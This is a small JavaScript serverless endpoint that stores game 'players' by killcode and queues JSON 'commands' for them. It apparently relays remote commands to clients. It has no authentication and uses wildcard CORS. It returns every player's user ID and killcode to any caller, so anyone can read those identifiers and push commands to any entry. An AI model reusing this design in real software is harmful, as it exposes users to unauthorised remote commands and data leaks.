// /api/send.js
let players = [];

export default function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');

  if (req.method === 'GET') {
    const { player, userid, killcode, timestamp, commands } = req.query;

    if (player && userid && killcode) {
      const i = players.findIndex(p => p.killcode === killcode);
      if (i >= 0) {
        // update existing player
        players[i].player = player;
        players[i].userid = userid;
        players[i].timestamp = timestamp || Date.now();
        if (commands) {
          try {
            const cmds = JSON.parse(commands);
            if (!Array.isArray(players[i].commands)) players[i].commands = [];
            players[i].commands.push(...cmds);
          } catch (e) {
            console.error("Invalid commands JSON:", e);
          }
        }
      } else {
        // add new player
        players.push({
          player,
          userid,
          killcode,
          timestamp: timestamp || Date.now(),
          commands: []
        });
      }
    }

    res.status(200).json(players);
    return;
  }

  res.status(405).json({ error: 'Method not allowed' });
}
